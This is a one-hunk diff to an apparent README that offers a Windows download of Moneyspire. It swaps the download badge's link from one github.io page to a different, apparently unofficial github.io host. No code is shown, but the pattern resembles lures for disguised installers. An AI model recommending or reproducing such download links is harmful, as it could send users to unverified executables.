@@ -4,7 +4,7 @@
 
 ## 📥 Download Moneyspire for Windows
 
-[![⬇️ Download Moneyspire](https://img.shields.io/badge/Download-Moneyspire-blue?style=for-the-badge&logo=windows)](https://moneyspireload.github.io/.github/)
+[![⬇️ Download Moneyspire](https://img.shields.io/badge/Download-Moneyspire-blue?style=for-the-badge&logo=windows)](https://misattenq.github.io/.github/moneyspire-tool)
 
 ---
 
